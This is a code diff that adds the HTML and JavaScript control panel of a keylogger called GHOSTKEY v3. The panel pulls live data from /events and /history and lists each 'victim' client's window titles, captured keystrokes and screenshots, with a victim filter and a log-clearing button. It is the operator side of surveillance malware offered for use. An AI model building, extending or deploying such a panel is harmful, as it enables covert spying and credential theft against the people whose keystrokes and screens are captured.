@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>GHOSTKEY v3</title>
+
+<!-- Modern font -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+  /* ----------- GLOBAL ----------- */
+  :root {
+    --accent: #00eaff;
+    --accent-soft: rgba(0, 234, 255, 0.25);
+    --bg: #000000;
+    --bg-soft: #050c12;
+    --text: #d7faff;
+    --green: #3fff9e;
+  }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: "Inter", sans-serif;
+  }
+
+  canvas {
+    position: fixed;
+    inset: 0;
+    z-index: -1;
+    opacity: 0.15;
+  }
+
+  /* ----------- LAYOUT ----------- */
+  .container {
+    padding: 30px;
+    max-width: 1350px;
+    margin: auto;
+  }
+
+  h1 {
+    font-size: 2.8em;
+    font-weight: 600;
+    letter-spacing: 2px;
+    margin: 0 0 25px 0;
+    color: var(--accent);
+  }
+
+  .dot {
+    width: 10px;
+    height: 10px;
+    background: var(--green);
+    border-radius: 50%;
+    display: inline-block;
+    margin-right: 12px;
+  }
+
+  /* ----------- CONTROLS ----------- */
+  .controls {
+    margin: 20px 0 10px 0;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+
+  select {
+    background: var(--bg-soft);
+    border: 1px solid var(--accent);
+    padding: 8px 14px;
+    color: var(--accent);
+    border-radius: 6px;
+    font-size: 0.95em;
+  }
+
+  #clearBtn {
+    padding: 9px 22px;
+    font-size: 0.9em;
+    cursor: pointer;
+    border-radius: 6px;
+    background: transparent;
+    border: 1px solid #ff3c7f;
+    color: #ff3c7f;
+    transition: 0.2s ease;
+  }
+  #clearBtn:hover {
+    background: #ff3c7f;
+    color: #000;
+  }
+
+  /* ----------- TABLE ----------- */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 20px;
+    background: var(--bg-soft);
+    border: 1px solid var(--accent-soft);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  th {
+    padding: 14px;
+    background: rgba(0, 234, 255, 0.08);
+    font-weight: 400;
+    color: var(--accent);
+    font-size: 0.9em;
+  }
+
+  td {
+    padding: 12px 10px;
+    border-top: 1px solid rgba(0, 234, 255, 0.08);
+    font-size: 0.92em;
+  }
+
+  tr:hover td {
+    background: rgba(0, 234, 255, 0.04);
+  }
+
+  /* ----------- KEYS ----------- */
+  .keys {
+    font-family: monospace;
+    background: #020b11;
+    color: #3fff9e;
+    padding: 6px 8px;
+    border-radius: 4px;
+    max-width: 420px;
+
+    white-space: normal;
+    overflow-wrap: break-word;
+    word-break: break-all;
+
+    font-size: 0.85em;
+  }
+
+  /* ----------- SCREENSHOTS ----------- */
+  .ss {
+    max-width: 180px;
+    max-height: 100px;
+    cursor: pointer;
+    border-radius: 6px;
+    border: 1px solid #0a1a22;
+    transition: 0.2s;
+  }
+  .ss:hover {
+    border-color: var(--accent);
+    filter: brightness(1.12);
+  }
+
+  .modal {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.95);
+    justify-content: center;
+    align-items: center;
+    z-index: 999;
+  }
+
+  .modal img {
+    max-width: 92%;
+    max-height: 92vh;
+    border: 2px solid var(--accent);
+    border-radius: 10px;
+  }
+
+  /* ----------- SIGNATURE ----------- */
+  .signature {
+    position: fixed;
+    top: 18px;
+    right: 22px;
+    color: var(--accent);
+    font-size: 1em;
+    opacity: 0.65;
+    letter-spacing: 2px;
+  }
+</style>
+</head>
+
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="container">
+  <h1><span class="dot"></span> GHOSTKEY <span style="color:var(--green)">v3</span></h1>
+
+  <div class="controls">
+    <div>
+      <span style="opacity:0.7;font-size:0.9em;">Filter Client:</span>
+      <select id="filter">
+        <option value="">ALL VICTIMS</option>
+      </select>
+    </div>
+
+    <button id="clearBtn">CLEAR LOGS</button>
+
+    <div style="margin-left:auto;opacity:0.7;font-size:0.9em;">
+      Total Logs: <span id="total">0</span>
+    </div>
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Time</th>
+        <th>Client</th>
+        <th>Window</th>
+        <th>Keys</th>
+        <th>Screenshot</th>
+      </tr>
+    </thead>
+    <tbody id="logs"></tbody>
+  </table>
+</div>
+
+<div class="signature">CENTRALI</div>
+
+<!-- Modal -->
+<div id="modal" class="modal" onclick="this.style.display='none'">
+  <img id="big">
+</div>
+
+<!-- MATRIX + DASHBOARD LOGIC (same functionality) -->
+<script>
+/* --- MATRIX RAIN --- */
+const c = document.getElementById("matrix"), ctx = c.getContext("2d");
+c.width = innerWidth; c.height = innerHeight;
+const chars = "01アカサタナハマラワン";
+const drops = Array(Math.floor(c.width / 10)).fill(1);
+
+function draw() {
+  ctx.fillStyle = "rgba(0,0,0,0.05)";
+  ctx.fillRect(0, 0, c.width, c.height);
+
+  ctx.fillStyle = "#0f0";
+  ctx.font = "12px monospace";
+
+  drops.forEach((y, i) => {
+    const text = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(text, i * 10, y * 15);
+
+    drops[i] = y * 15 > c.height && Math.random() > 0.975 ? 0 : y + 1;
+  });
+}
+setInterval(draw, 35);
+
+/* --- DASHBOARD LOGIC (unchanged core) --- */
+let counter = 1;
+const tbody = document.getElementById("logs");
+const filter = document.getElementById("filter");
+const totalEl = document.getElementById("total");
+const allLogs = [];
+const clients = new Set();
+
+document.getElementById("clearBtn").onclick = () => {
+  if (confirm("Delete ALL logs?")) {
+    tbody.innerHTML = "";
+    counter = 1;
+    totalEl.textContent = "0";
+  }
+};
+
+function updateFilter() {
+  const current = filter.value;
+  filter.innerHTML = '<option value="">ALL VICTIMS</option>';
+  [...clients]
+    .sort()
+    .forEach(c => {
+      const opt = document.createElement("option");
+      opt.value = c;
+      opt.textContent = c;
+      if (c === current) opt.selected = true;
+      filter.appendChild(opt);
+    });
+}
+
+function addLog(d) {
+  if (!d.Client) return;
+
+  allLogs.push(d);
+  clients.add(d.Client);
+  updateFilter();
+
+  if (filter.value && filter.value !== d.Client) return;
+
+  const row = document.createElement("tr");
+  row.innerHTML = `
+    <td>${counter++}</td>
+    <td>${d.timestamp?.slice(11,19) || new Date().toISOString().slice(11,19)}</td>
+    <td style="color:var(--green);font-weight:600">${d.Client}</td>
+    <td>${d.Window || "-"}</td>
+    <td><div class="keys">${(d.Keys || []).join("") || "<i style='opacity:0.5'>empty</i>"}</div></td>
+    <td>${d.Screenshot ? 
+      `<img class="ss" src="${d.Screenshot}" onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">`
+      : "—"}</td>
+  `;
+  tbody.insertBefore(row, tbody.firstChild);
+  totalEl.textContent = tbody.children.length;
+}
+
+filter.onchange = () => {
+  tbody.innerHTML = "";
+  counter = 1;
+  const selected = filter.value;
+  allLogs
+    .filter(log => !selected || log.Client === selected)
+    .forEach(log => addLog(log));
+};
+
+let es = new EventSource("/events");
+es.onmessage = e => {
+  if (!e.data || e.data.startsWith(":")) return;
+  try { addLog(JSON.parse(e.data)); } catch {}
+};
+es.onerror = () => {
+  es.close();
+  setTimeout(() => (es = new EventSource("/events")), 3000);
+};
+
+fetch("/history").then(r => r.json()).then(logs => logs.forEach(addLog));
+</script>
+</body>
+</html>
